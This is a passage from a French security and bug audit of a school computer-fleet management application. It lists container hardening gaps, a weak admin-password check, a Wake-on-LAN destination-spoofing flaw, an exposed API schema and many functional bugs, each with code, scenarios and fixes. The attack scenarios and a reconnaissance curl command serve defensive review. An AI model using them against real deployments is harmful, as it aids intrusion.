**Scénario.** Une CVE de nginx core ou d'openssl d'Alpine corrigée en 1.28/1.29 reste présente indéfiniment dans ghcr.io/…/tiai-frontend publié à chaque release. La CI reste verte parce que l'image n'est pas analysée. L'exposition est atténuée par Caddy devant, mais reste réelle pour le conteneur.

**Recommandation.** Passer à nginx:stable-alpine ou à la branche stable courante (1.30 au 2026-11-10 ; le tag 1.28-alpine n'est lui-même plus reconstruit depuis mars 2026), ou à nginxinc/nginx-unprivileged. Ajouter l'écosystème `docker` à Dependabot pour suivre les branches, et le frontend à la matrice du job Trivy.

<a id="s32"></a>

#### S32 — Backend et worker exécutés en root dans le conteneur, avec curl installé sans usage

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/Dockerfile:9`

Le Dockerfile du backend n'a aucune directive USER : uvicorn et le worker tournent en uid 0, avec les capacités Docker par défaut, et le volume packages appartient à root. curl est installé alors que les healthchecks utilisent Python et que rien dans app/ ne s'en sert. Une faille d'exécution de code (dépendance compromise, désérialisation) donne root dans le conteneur et un outil de téléchargement prêt à l'emploi.

```
FROM python:3.12-slim
...
RUN apt-get update && apt-get install -y --no-install-recommends curl \
...
ENTRYPOINT ["bash", "/app/app/scripts/entrypoint.sh"]
```

**Scénario.** Une RCE dans l'API permet d'écrire n'importe où dans le système de fichiers du conteneur, de modifier /app/app (persistant jusqu'au recreate) ou de remplacer un fichier de paquet dans /data/packages. Les postes vérifient néanmoins le SHA-256, ce qui atténue ce dernier point.

**Recommandation.** Créer un utilisateur non privilégié (useradd -r tiai), chown /data/packages, ajouter `USER tiai`. Supprimer curl. Dans compose, ajouter `cap_drop: [ALL]` et `security_opt: [no-new-privileges:true]` pour backend et worker.

<a id="s33"></a>

#### S33 — FIRST_ADMIN_PASSWORD n'a pas de longueur minimale et le compte admin initial échappe à PASSWORD_MIN_LENGTH

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/core/config.py:505`

La garde de démarrage refuse pour FIRST_ADMIN_PASSWORD seulement une valeur vide ou commençant par « changeme ». La variable est absente de SECRET_MIN_LENGTHS, et seed_admin crée le compte via crud.create_user, qui n'applique pas PASSWORD_MIN_LENGTH (comme le dit le commentaire de config). Un administrateur avec un mot de passe trivial peut donc être créé en production.

```
SECRET_MIN_LENGTHS = {
    "SECRET_KEY": 32,
    "ENROLLMENT_SECRET": 16,
    "ENROLLMENT_SECRET_PREVIOUS": 16,
}
...
            "FIRST_ADMIN_PASSWORD",
```

**Scénario.** Un opérateur remplace le placeholder par `FIRST_ADMIN_PASSWORD=admin2026` dans .env. Le serveur démarre en production avec le compte admin@… / admin2026, devinable en quelques essais (5 avant verrouillage, renouvelables toutes les 15 min).

**Recommandation.** Ajouter FIRST_ADMIN_PASSWORD à SECRET_MIN_LENGTHS avec la valeur de PASSWORD_MIN_LENGTH, ou valider sa longueur dans le validateur _refuse_weak_secrets.

<a id="s34"></a>

#### S34 — index.html servi sans Cache-Control : console cassée après une mise à jour

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/nginx.conf:16`

Constat fonctionnel lié au déploiement, pas de sécurité. Seuls les assets reçoivent `expires 1y; immutable` ; index.html (location / via try_files) part sans Cache-Control, avec un simple Last-Modified, ce qui laisse le navigateur appliquer une fraîcheur heuristique d'environ 10 % de l'âge du fichier. Après une montée de version, un navigateur peut garder l'ancien index.html, qui pointe vers des chunks hachés absents de la nouvelle image. Les 19 routes en import() échouent alors en 404 (la location regex des .js n'a pas de fallback), et rien n'intercepte l'erreur (aucun router.onError ni vite:preloadError dans src/). Par ailleurs, la règle `immutable` d'un an vise des extensions et non le dossier /assets/ : elle s'appliquerait à tout fichier non haché servi à la racine. Le dépôt n'en contient pas aujourd'hui (le `favicon.ico` référencé par index.html n'existe pas).

```
location ~* \.(js|css|woff2?|ttf|eot|svg|png|jpg|ico)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
    location / {
        try_files $uri $uri/ /index.html;
    }
```

**Scénario.** Image construite 30 jours avant la mise en production : index.html reste frais environ 3 jours dans le cache. Après la mise à jour du serveur, un opérateur ouvre la console : la page se charge, mais un clic vers « Postes » échoue (chargement de chunk en 404) jusqu'à un rechargement forcé.

**Recommandation.** Ajouter `location = /index.html { add_header Cache-Control "no-cache"; }` (et appliquer no-cache au fallback SPA). Limiter `immutable` aux fichiers hachés sous /assets/. Côté console, recharger la page sur l'événement vite:preloadError.

<a id="s35"></a>

#### S35 — Réveil direct : l'IP et le masque déclarés par l'agent choisissent la destination UDP du serveur, y compris 255.255.255.255 ou un hôte quelconque

**Sévérité :** Info · **Statut :** vérifié · **Emplacement :** `backend/app/features/wol/packet.py:105`

En mode serveur (sans relais), `emit_wake` envoie WOL_PACKET_COUNT datagrammes vers `broadcast_for(machine.ip_address, machine.ip_prefix_length)`. Ces deux valeurs viennent du heartbeat. Le validateur n'accepte qu'une IP littérale, publique ou non, et un masque de 1 à 128. Le commentaire du validateur dit exclure /0 pour ne pas obtenir 255.255.255.255, mais /1 sur une adresse ≥ 128.0.0.0 donne exactement cette adresse. /32 produit un unicast vers n'importe quel hôte, et /8 un broadcast dirigé vers tout un 10.0.0.0/8, que deploy/wol/enable-directed-broadcast.sh (bc_forwarding=1 sur all) laisse ensuite sortir de l'hôte. Cela suppose WOL_BROADCAST_ADDRESSES vide (valeur par défaut ; sinon les valeurs déclarées sont ignorées) et le relais désactivé.

```
interface = ipaddress.ip_interface(f"{ip}/{prefixlen}")
...
    return str(interface.network.broadcast_address)
# vérifié : destinations_for('200.1.2.3', reported_prefixlen=1) -> ['255.255.255.255'] ; ('8.8.8.8', 32) -> ['8.8.8.8'] ; ('10.9.9.9', 8) -> ['10.255.255.255']
```

**Scénario.** Un agent compromis déclare ip_address=10.9.9.9 et ip_prefix_length=8. Lors d'un « Réveiller la salle », le serveur diffuse ses paquets magiques sur 10.255.255.255 au lieu du sous-réseau du poste. Avec 8.8.8.8/32, le serveur envoie de l'UDP/9 vers un hôte Internet choisi par l'attaquant. La console affiche malgré tout « Paquet magique émis », en nommant toutefois la destination (« … sur 10.255.255.255:9 »).

**Recommandation.** Côté serveur, n'accepter que des adresses privées ou appartenant à une liste de réseaux configurée (WOL_ALLOWED_NETWORKS). Borner le masque IPv4 rapporté à une plage plausible (/16 à /30). Ne jamais dériver 255.255.255.255 et refuser les adresses non RFC1918. Dans le script de bc_forwarding, limiter le réglage à l'interface LAN plutôt qu'à « all ».

<a id="s36"></a>

#### S36 — Schéma OpenAPI complet exposé sans authentification via Caddy

**Sévérité :** Info · **Statut :** vérifié · **Emplacement :** `backend/app/main.py:57`

openapi_url vaut /api/v1/openapi.json, sous le préfixe /api/* que Caddy relaie, sans condition d'environnement ni d'authentification. Toute personne qui atteint le serveur obtient la carte complète de l'API : routes agent, enrôlement, téléversement de paquets, paramètres, schémas des champs. /docs et /redoc ne sont pas joignables, car Caddy les envoie vers la console.

```
app = FastAPI(
    title=settings.PROJECT_NAME,
    openapi_url=f"{settings.API_V1_STR}/openapi.json",
```

**Scénario.** `curl https://tiai.natimai.local/api/v1/openapi.json` depuis n'importe quel poste élève liste tous les points d'entrée et paramètres, ce qui facilite la reconnaissance avant une attaque.

**Recommandation.** Mettre openapi_url (et docs_url/redoc_url) à None hors ENVIRONMENT=local, ou le servir derrière une dépendance d'authentification.


### 7.2 Bugs fonctionnels frontend / backend

<a id="b01"></a>

#### B01 — La carte « Disque presque plein » ouvre tout le parc dès que le seuil réglé n'est ni 10 ni 20 %

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/utils/machineListFilters.ts:314`

Le seuil d'espace disque libre est un réglage serveur modifiable de 1 à 99 % (settings_routes.py:235). Le tableau de bord le place dans le lien de sa carte (DashboardPage.vue:287). Mais à la lecture de l'URL, machineFiltersFromQuery ne garde la valeur que si elle figure dans DISK_OPTIONS, qui ne contient que 10 et 20. Toute autre valeur est remplacée par null : le filtre disparaît sans avertissement, ni la liste ni l'export ne l'appliquent, et aucune puce ne s'affiche.

```
diskFree: DISK_OPTIONS.some((o) => o.value === below) ? below : null,  // DISK_OPTIONS = [null, 10, 20] ; DashboardPage: query: { disk_free_below: String(s.low_disk_free_percent) }
```

**Scénario.** Un administrateur règle le seuil à 15 % dans Paramètres. Le tableau de bord affiche « Disque presque plein : 12 ». Un clic sur la carte ouvre /machines?disk_free_below=15, et la liste montre les 800 postes du parc sans aucune puce de filtre. Un export lancé depuis cet écran contient lui aussi tout le parc.

**Recommandation.** Accepter tout entier entre 1 et 99 dans machineFiltersFromQuery, comme le fait déjà machineListParamsFromQuery. Afficher une puce « Moins de N % libres » pour une valeur hors liste, ou ajouter dynamiquement l'option correspondant au seuil serveur dans le menu déroulant.

<a id="b02"></a>

#### B02 — Fiche poste et tableau de bord entièrement inaccessibles sans les droits threat:read ou command:read

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachineDetailPage.vue:750` · aussi : 

Les groupes sont configurables : on peut accorder machine:read sans threat:read ni command:read. Or fetchAll lance getMachine, deux appels listThreats et listCommands dans un même Promise.all, sans vérifier auth.can. Côté serveur, /threats exige threat:read et /commands exige command:read. Si l'un de ces appels répond 403, tout le Promise.all échoue : machine reste null et la fiche ne s'affiche pas. Le tableau de bord a le même défaut (DashboardPage.vue:363) : listThreats y est appelé avec getOverview, donc les compteurs, pourtant autorisés par machine:read, ne s'affichent pas non plus.

```
const [m, t, active, c] = await Promise.all([
    getMachine(props.id),
    listThreats({ machine_id: props.id, ... }),
    listThreats({ machine_id: props.id, status: 'active', ... }),
    listCommands({ machine_id: props.id, ... }),
  ]);
```

**Scénario.** On crée un groupe « Inventaire » avec machine:read seul, pour un gestionnaire de matériel. Le menu lui donne accès à Postes et au Tableau de bord. En ouvrant n'importe quelle fiche, il ne voit que la bannière d'erreur : le 403 sur /threats fait échouer tout le chargement. Le tableau de bord reste vide pour la même raison.

**Recommandation.** Ne lancer listThreats et listCommands que si auth.can('threat','read') et auth.can('command','read') sont vrais, sur la fiche comme sur le tableau de bord. Utiliser Promise.allSettled pour les données annexes, afin que la fiche et les compteurs s'affichent même si une liste secondaire échoue.

*Signalé aussi sous un autre angle :* La fiche poste et le tableau de bord ne s'affichent pas sans threat:read ou command:read

<a id="b03"></a>

#### B03 — La fusion de postes perd first_seen et les réglages de maintenance de l'enregistrement supprimé

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/features/machine/crud.py:76`

merge_into rattache à la cible les commandes, menaces, interventions, vérifications et compteurs d'usage de la source. Elle reprend aussi last_seen, room_id et last_maintenance_at. En revanche, elle ignore first_seen, ainsi que maintenance_cycle_days (où 0 signifie « exclu ») et maintenance_owner_id, définis à la main dans la console, puis supprime la source. Or le cas typique est de garder le nouvel enregistrement et de fusionner l'ancien. Ensuite, usage_hours() renvoie None pour la cible, car son first_seen est postérieur au début de la fenêtre, alors que les heures de l'ancien enregistrement viennent d'y être fusionnées. Le filtre « Peu utilisés » exclut ce poste (enrolled_before), et l'histogramme hachure en « non mesuré » des jours qui ont pourtant des heures. La moyenne est alors gonflée, puisqu'elle divise le total par moins de jours. L'échéance de maintenance, calculée par COALESCE(last_maintenance_at, first_seen), est elle aussi décalée.

```
if source.last_seen > target.last_seen:
        target.last_seen = source.last_seen
    if target.room_id is None:
        target.room_id = source.room_id
    ...
    await session.delete(source)   # first_seen, maintenance_cycle_days, maintenance_owner_id de la source perdus
```

**Scénario.** Un PC est réimagé et réapparaît sous un nouvel enregistrement, créé il y a 2 jours. L'ancien enregistrement, connu depuis un an, avait été exclu de la maintenance (cycle 0) et confié à un technicien. Après la fusion vers le nouvel enregistrement, le poste revient dans le cycle de maintenance alors qu'il en était exclu, sans responsable. Si l'ancien enregistrement n'avait pas de date de maintenance, l'échéance part d'un first_seen de 2 jours : elle est repoussée, pas avancée. Sa colonne « Allumé (7 j) » affiche « depuis 2 j » alors que les compteurs fusionnés contiennent 35 h, et son histogramme sur 28 jours montre 26 jours hachurés.

**Recommandation.** Dans merge_into, appliquer target.first_seen = min(source.first_seen, target.first_seen). Reprendre maintenance_cycle_days et maintenance_owner_id quand la cible n'en a pas. Ajouter un test de fusion couvrant usage_hours et l'échéance de maintenance.

<a id="b04"></a>

#### B04 — Échecs de rechargement ignorés après le premier succès : la liste affiche d'anciennes lignes sous le nouveau filtre

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachinesPage.vue:12` · aussi : 

Chaque chargement lancé par l'utilisateur (changement de filtre, de page ou de tri, clic sur Actualiser) passe par useAutoRefresh.refreshNow, qui intercepte l'erreur et la range dans lastError sans la relancer. Or la bannière ne s'affiche que si lastError && !lastRefreshedAt, c'est-à-dire seulement quand aucun chargement n'a jamais réussi. Après un premier succès, un échec ne produit aucune notification. L'URL et les puces montrent le nouveau filtre, mais le tableau garde les lignes et le total de l'ancienne requête. La fiche poste a le même problème (MachineDetailPage.vue:197). En passant au poste suivant, machine est remis à null avant le rechargement, donc un échec laisse une page vide sans message.

```
<LoadErrorBanner
      v-if="lastError && !lastRefreshedAt"
      ...
/* useAutoRefresh.run */ } catch (e) {
        // Not rethrown: see the doc comment. Recorded for the page to decide.
        lastError.value = e;
```

**Scénario.** La liste est chargée sur tout le parc (800 postes). Pendant un redéploiement, l'API répond 502 un court instant. L'utilisateur choisit alors « Antivirus périmé » : la puce s'affiche, mais le tableau continue de montrer les 800 postes. Il sélectionne tout et lance un scan rapide sur des postes qui ne sont pas concernés. Sur la fiche, cliquer sur « Suivant » pendant une coupure affiche un en-tête vide « Poste » sans aucune erreur.

**Recommandation.** Faire la différence entre un rafraîchissement automatique, qui peut rester silencieux, et un chargement demandé par l'utilisateur. Dans reload(), relancer ou notifier l'erreur ($q.notify). Afficher aussi un bandeau non bloquant quand lastError est renseigné, même si un chargement a déjà réussi. Enfin, vider les lignes ou les marquer comme obsolètes quand les filtres ont changé.

*Signalé aussi sous un autre angle :* Liste des postes : après un changement de filtre en échec, les anciennes lignes restent affichées sous le nouveau filtre

<a id="b05"></a>

#### B05 — La sélection de postes survit aux changements de filtre et de page, et les actions groupées visent des postes masqués

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachinesPage.vue:203` · aussi : `frontend/src/components/machines-list/MachinesBulkBar.vue:8`

onFilters et onRequest réécrivent la requête et rechargent la liste, mais ne vident jamais selected. Avec la pagination côté serveur, les postes sélectionnés précédemment restent dans le tableau selected même s'ils ne sont plus affichés. Les actions groupées (commandes, réveil, affectation de salle, demande de vérification) portent sur selected.map(m => m.id). De plus, tant que la sélection n'est pas vide, le rafraîchissement automatique est suspendu (paused: () => selected.value.length > 0) : la liste cesse de suivre le parc.

```
function onFilters(next: MachineFilters) {
  filters.value = next;
  pushQuery();
}
/* useMachineBulkActions */ const selectedIds = () => selected.value.map((m) => m.id);
```

**Scénario.** Un utilisateur coche 3 postes de la salle B12, puis change le filtre pour la salle B14 et coche 2 postes. Il lance « Redémarrer » : la confirmation annonce 5 postes, et 3 postes de B12 qu'il ne voit plus à l'écran sont redémarrés en plein cours.

**Recommandation.** Vider selected dans onFilters et dans pushQuery. Sinon, afficher clairement dans la barre d'actions groupées les postes sélectionnés qui ne sont plus visibles, et les lister dans la confirmation.

*Signalé aussi sous un autre angle :* Sélection invisible conservée entre filtres et pages, sans bouton pour la vider ; elle met en pause l'actualisation automatique

<a id="b06"></a>

#### B06 — Supprimer une ligne « Maintenance » ou enregistrer une date future fausse durablement l'échéance du poste, sans moyen de correction

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/features/maintenance/crud.py:157` · aussi : `frontend/src/components/maintenance/MaintenanceSessionDialog.vue:13`

machines.last_maintenance_at est présenté comme une valeur dérivée du journal (commentaire dans machine/models.py), mais seule la création d'une séance l'avance. La suppression ou la modification d'une intervention (interventions.py, delete et patch) ne le recalcule jamais. Aucune route ne permet de supprimer ou corriger une séance de maintenance. Par ailleurs, SessionCreate.performed_at n'a aucune borne : une date future est acceptée et le champ datetime-local du dialogue n'a pas de max. À l'inverse, une intervention de type « maintenance » saisie à la main dans l'historique ne fait pas avancer le cycle, alors qu'elle s'affiche de la même façon.

```
if (
            machine.last_maintenance_at is None
            or performed_at > machine.last_maintenance_at
        ):
            machine.last_maintenance_at = performed_at
--- interventions.py delete_intervention :
    await session.delete(row)
    await session.commit()
```

**Scénario.** Un technicien enregistre la séance de la salle B12 en tapant 2027 au lieu de 2026 dans « Date ». Les 30 postes passent « À jour » jusqu'en 2027. Il supprime alors les 30 lignes « Maintenance » depuis la fiche de chaque poste : last_maintenance_at reste en 2027, les postes restent « À jour » et disparaissent des « Maintenances à faire ». Aucune action de la console ne peut rétablir l'échéance. Autre cas : un poste est maintenu et la ligne est saisie à la main avec le type « Maintenance » ; il reste « En retard ».

**Recommandation.** Recalculer last_maintenance_at à partir de max(performed_at) des interventions de type maintenance chaque fois qu'une intervention est créée, modifiée (date ou type) ou supprimée. Refuser côté backend un performed_at (et un closed_at) postérieur à maintenant, avec une petite tolérance, et ajouter max sur le champ du dialogue. Prévoir aussi la suppression ou correction d'une séance entière, auditée.

*Signalé aussi sous un autre angle :* Une date de séance dans le futur est acceptée et ne peut plus être corrigée : les postes sortent de la maintenance pendant des années

<a id="b07"></a>

#### B07 — Supprimer un bâtiment échoue en 500 dès qu'une salle de même nom existe déjà hors bâtiment

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/rooms.py:451`

Le nom d'une salle est unique par (building_id, name), avec NULLS NOT DISTINCT. Supprimer un bâtiment met building_id à NULL sur ses salles (ON DELETE SET NULL). delete_building ne vérifie pas que ces salles ne heurtent pas une salle déjà sans bâtiment. La violation d'unicité remonte en IntegrityError, que seul le gestionnaire générique attrape : il renvoie 500. update_room fait ce contrôle, delete_building non.

```
await crud.detach_building(session, building)
    audit.record(...)
    await session.delete(building)
    await session.commit()
--- models.py :
UniqueConstraint("building_id", "name", name="uq_rooms_building_name", postgresql_nulls_not_distinct=True)
```

**Scénario.** Les bâtiments A et B contiennent chacun une « Salle 101 ». On supprime A : sa « Salle 101 » devient une salle sans bâtiment. On supprime ensuite B : la mise à NULL de building_id produit un second (NULL, "Salle 101"), le commit lève une IntegrityError et la console affiche « Suppression impossible » sans explication. Le même blocage survient si une salle « 101 » créée à la main ou par l'annuaire (room_for_key crée des salles sans bâtiment) existe déjà.

**Recommandation.** Avant la suppression, chercher les collisions de noms entre les salles du bâtiment et les salles sans bâtiment. Renvoyer un 409 ROOM_NAME_TAKEN qui liste les salles en conflit, ou les renommer automatiquement (suffixe « (2) », comme room_for_key).

<a id="b08"></a>

#### B08 — Responsable par défaut supprimé ou désactivé : ses postes n'apparaissent plus dans aucun filtre « Les miennes » ou « À prendre »

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/features/maintenance/crud.py:68` · aussi : `backend/app/api/routes/settings_routes.py:483`, `backend/app/api/routes/checks.py:370`

Le responsable par défaut du parc est un UUID en texte dans app_settings, sans clé étrangère. La suppression d'un compte (users.py, delete_user) ne le nettoie pas. La désactivation d'un compte ne réaffecte ni les maintenance_owner_id des salles et postes, ni les vérifications assignées (assigned_to_id). resolve() renvoie donc un owner_id non NULL qui ne correspond à aucun compte actif. Pour un compte supprimé, _ref() l'affiche comme « sans responsable », mais le filtre « none » l'exclut parce que owner_id n'est pas NULL. Un compte seulement désactivé reste affiché sous son nom (user_names ne filtre pas is_active) : ses postes restent attribués à quelqu'un qui ne se connecte plus. La suppression ne laisse en suspens que le réglage global : machines.maintenance_owner_id et machine_checks.assigned_to_id sont en ON DELETE SET NULL.

```
if unowned and res.owner_id is not None:
            continue
--- policy.py :
owner, owner_origin = policy.owner_id, Origin.GLOBAL
--- setting/crud.py :
owner_id=uuid.UUID(owner) if isinstance(owner, str) and owner else None
```

**Scénario.** L'administrateur règle le responsable par défaut sur Paul, puis supprime le compte de Paul. Sur « Mes tâches », chaque salle qui hérite du parc s'affiche « sans responsable » dans « Toutes », mais l'onglet « À prendre » (owner=none) est vide et personne ne la voit dans « Les miennes ». Les maintenances en retard ne sont plus prises par personne. Une vérification assignée à un compte désactivé reste, elle, à son nom et n'apparaît pas dans « À prendre ».

**Recommandation.** Ignorer dans resolve() les responsables absents ou inactifs, ce qui les traite comme « sans responsable », ou effacer KEY_OWNER à la suppression du compte. Lors de la désactivation, proposer ou effectuer la réaffectation des salles, postes et vérifications. Faire concorder le filtre 'none' avec ce que _ref affiche.

*Signalé aussi sous un autre angle :* Un responsable de maintenance par défaut désactivé bloque l'enregistrement de toute la carte Maintenance ; Impossible de modifier une demande ou le cycle tant que le responsable ou l'assigné actuel est désactivé (404 « User not found »)

<a id="b09"></a>

#### B09 — La séance de salle coche par défaut les postes exclus, et « Maintenances à faire » liste aussi les postes à jour

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/features/maintenance/crud.py:94` · aussi : `frontend/src/pages/TasksPage.vue:118`

group_due ajoute chaque poste d'une salle à entry.machines avant de tester l'état EXCLUDED. Les postes exclus (cycle 0) sont donc listés, ce qui contredit la docstring de /maintenance/due (« Excluded postes are counted, not listed »). Les postes et salles « à jour » sont eux aussi renvoyés. Dans TasksPage, la section « Maintenances à faire » affiche alors toutes les salles du responsable, badge « à jour » compris, et MaintenanceSessionDialog coche par défaut tous les postes, y compris les exclus (serveur, VM).

```
entry.total += 1
        entry.machines.append((machine, res))
        if res.state == MaintenanceState.EXCLUDED:
            entry.excluded += 1
            continue
--- MaintenanceSessionDialog.vue :
      done: true,
```

**Scénario.** La salle Serveurs contient 3 postes exclus et 2 postes à faire. Depuis « Mes tâches », « Effectuer la maintenance » propose les 5 postes, tous cochés. Le technicien valide : les 3 serveurs exclus reçoivent une ligne « Maintenance » et une date last_maintenance_at alors qu'ils ne sont pas suivis. Par ailleurs, la liste « à faire » d'un responsable de 40 salles toutes à jour n'affiche jamais « Rien à faire ».

**Recommandation.** Ne pas ajouter les postes exclus à entry.machines, ou les renvoyer avec un indicateur et les décocher par défaut dans le dialogue. Filtrer les salles sans poste overdue ou due_soon dans la section « à faire », ou la renommer « Suivi des maintenances ».

*Signalé aussi sous un autre angle :* « Maintenances à faire » liste aussi les salles à jour, et le dialogue pré-coche tous les postes, y compris ceux à jour ou exclus

<a id="b10"></a>

#### B10 — Les commandes « Transmise » ou « En cours » ne sont jamais relivrées ni expirées : l'agent compte sur une relivraison que le serveur ne fait pas

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/agent.py:815`

Le heartbeat ne remet que les commandes PENDING et les passe aussitôt à DELIVERED (l. 815-829). Rien ne remet ensuite une DELIVERED en file : mark_expired et expire_stale_commands ne touchent que PENDING (command/crud.py l. 113-131, worker.py l. 68-77). Aucune tâche ne ferme non plus une DELIVERED ou une RUNNING trop ancienne. L'agent, lui, part du principe inverse. En cas de file pleine, il « oublie » la commande « so a later heartbeat can re-offer it ». À l'arrêt, il abandonne sa file en mémoire (« the server re-offers them at the next start »). Un type inconnu (agent ancien qui reçoit package_install, ou wake_on_lan en tant que relais) est ignoré sans renvoyer de résultat. Dans tous ces cas, la ligne reste « Transmise » sans verdict jusqu'à sa purge, après COMMAND_RETENTION_DAYS (365 jours par défaut). Une commande coupée par l'extinction du poste reste « En cours » pour toujours : purge_before ne supprime pas les RUNNING (PURGEABLE_STATUSES). Ne balayer que les PENDING est un choix commenté côté serveur (command/crud.py l. 35-41 et 134-138) ; le défaut est la contradiction avec ce que l'agent suppose.

```
backend/app/api/routes/agent.py:815-829
    rows = await session.exec(
        select(Command)
        .where(Command.machine_id == machine.id)
        .where(Command.status == CommandStatus.PENDING)
...
    for cmd in pending:
        cmd.status = CommandStatus.DELIVERED

agent/internal/agent/agent.go:524-530
	default:
		// Backlog full — forget it so a later heartbeat can re-offer it.
		a.release(cmd.ID)
```

**Scénario.** Un samedi, une salle est éteinte. L'administrateur y déploie 20 paquets (une ligne par paquet, la dédup ne regroupe rien). Le lundi, chaque poste reçoit les 20 commandes dans un seul heartbeat. Le worker en exécute une, le canal en garde 16, les 3 dernières sont abandonnées. Elles restent « Transmise » jusqu'à la purge, un an plus tard, sur la page du paquet et du poste, sans erreur et sans relance. Autre cas : un wu_install est interrompu par l'extinction du poste en fin de cours, et la ligne affiche « En cours » indéfiniment.

**Recommandation.** Choisir une règle et l'appliquer des deux côtés. Option 1 : le serveur relivre les DELIVERED sans verdict après un délai (par exemple delivered_at + N heartbeats, avec l'idempotence par id déjà présente dans accept()). Option 2 : le worker passe en FAILED/EXPIRED (« sans réponse du poste ») les DELIVERED/RUNNING dont expires_at ou une durée maximale par type est dépassée. Dans les deux cas, corriger les commentaires de l'agent et faire envoyer un `failed` pour un type inconnu.

<a id="b11"></a>

#### B11 — useAutoRefresh relance l'intervalle après le démontage si refreshNow() était en cours : polling qui fuit

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/composables/useAutoRefresh.ts:160`

refreshNow() arrête le timer, attend la requête, puis appelle startTimer() dans un `finally`. Si le composant est démonté pendant l'attente, onScopeDispose(stop) a déjà vidé le timer : le `finally` crée alors un nouveau setInterval que plus personne n'annulera. Aucun drapeau « disposed » ne l'empêche. MachineDetailPage appelle refreshNow() au montage (load()) et après chaque commande ou réveil (send/sendWake → load()). C'est aussi le cas de MachinesPage et DashboardPage.

```
async function refreshNow(): Promise<void> {
    stopTimer();
    missed = false;
    try {
      if (inFlight) await inFlight;
      await run();
    } finally {
      startTimer();
    }
  }
...
  onScopeDispose(stop);
```

**Scénario.** On ouvre la fiche d'un poste depuis la liste, puis on revient en arrière avant la fin du premier chargement (réseau lent, 4 requêtes en parallèle). Le setInterval recréé lance fetchAll() toutes les 90 s pour ce poste, jusqu'au rechargement de l'onglet. Après N allers-retours, il y a N pollings fantômes, chacun de 4 à 5 requêtes HTTP.

**Recommandation.** Ajouter `let disposed = false`, le passer à true dans stop(), et dans le `finally` de refreshNow n'appeler startTimer() que si `!disposed`. Garder aussi startTimer() contre `disposed`. Ajouter un cas au spec : dispose pendant un refreshNow en attente, puis aucun tick.

<a id="b12"></a>

#### B12 — « Rafraîchir l'inventaire » n'apparaît dans aucun menu : le groupe 'inventory' manque à groupOrder

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/services/commands.ts:324`

inventory_scan est déclaré dans commandActions avec `group: 'inventory'`, mais commandActionGroups() ne parcourt que groupOrder, qui ne contient pas 'inventory'. Les menus de la fiche poste (MachineDetailPage) et des actions groupées (MachinesPage) sont construits uniquement par cette fonction. La commande n'est donc proposée nulle part, alors que MachineStorageCard renvoie explicitement l'utilisateur vers « Rafraîchir l'inventaire ». Le test commands.spec.ts (l. 122-129) fige d'ailleurs l'ordre sans 'inventory', ce qui masque le trou.

```
const groupOrder: CommandGroup[] = [
  'defender',
  'windows_update',
  'power',
  'maintenance',
  'diagnostic',
];
```

**Scénario.** Un administrateur veut forcer le relevé matériel ou logiciel après une installation et suit l'indication de la carte Stockage (« « Rafraîchir l'inventaire » force un relevé »). L'entrée n'existe dans aucun menu : il doit attendre le cycle quotidien de l'agent.

**Recommandation.** Insérer 'inventory' dans groupOrder (par exemple après 'windows_update') et mettre à jour les deux attentes de commands.spec.ts. Ajouter un test qui vérifie que chaque CommandAction apparaît dans commandActionGroups().

<a id="b13"></a>

#### B13 — Remplacer ou retirer un fichier d'un paquet casse les déploiements déjà remis (404 sur le téléchargement)

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/agent.py:998`

L'agent reçoit le manifeste figé au moment de la remise, avec les sha256 des fichiers. La route de téléchargement exige pourtant que la ligne PackageFile(package_id, sha256) existe encore. Après un remplacement (même nom, nouveau contenu) ou un delete_file, l'ancien sha256 n'est plus dans package_files : la route répond 404, alors même que le blob peut encore exister (il n'est jamais supprimé en cas de remplacement). delete_file supprime d'ailleurs le blob dès qu'aucun paquet ne le cite, sans tenir compte des commandes DELIVERED/RUNNING. Cela contredit storage.py (« the hash the manifest names is the file the agent downloads, whatever happens to the package row afterwards »). Côté agent, un 404 tombe dans le cas `default` de FetchPackageFile : erreur définitive, donc commande en échec.

```
row = (
        await session.exec(
            select(PackageFile)
            .where(col(PackageFile.package_id) == package_id)
            .where(col(PackageFile.sha256) == sha256)
            .limit(1)
        )
    ).first()
    if row is None:
        raise not_found
```

**Scénario.** 8 h 00 : déploiement de « Pronote » sur un site, 40 postes reçoivent la commande et commencent à télécharger (2 Gio max, 20 téléchargements simultanés). 8 h 05 : l'admin corrige le fichier .iss et le redépose sous le même nom. Tous les postes qui n'ont pas fini (ou pas encore commencé, à cause des 429) obtiennent 404 et passent en « Échec ».

**Recommandation.** Autoriser le téléchargement d'après le blob, sans exiger la ligne courante : vérifier que la commande ouverte existe et que `path_for(sha256)` existe (le nom peut venir du manifeste remis). Dans delete_file et au remplacement, ne pas supprimer un blob encore cité par une commande DELIVERED/RUNNING du paquet. À défaut, refuser (409) la modification des fichiers d'un paquet qui a des déploiements ouverts.

<a id="b14"></a>

#### B14 — La page d'un paquet n'affiche que les 50 derniers déploiements, sans pagination ni total ni agrégat

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/PackageDetailPage.vue:313`

listPackageCommands demande toujours la page 1 avec page_size=50. Le tableau « Déploiements » masque la pagination (`hide-pagination`, `rows-per-page-options=[0]`) et n'utilise pas `total`. Il n'y a ni compteur par statut (réussies/échecs/en attente) ni rafraîchissement automatique. Pour un déploiement « Tout le parc » ou un site de plus de 50 postes, l'administrateur ne voit qu'une partie des postes et rien ne lui signale que la liste est tronquée.

```
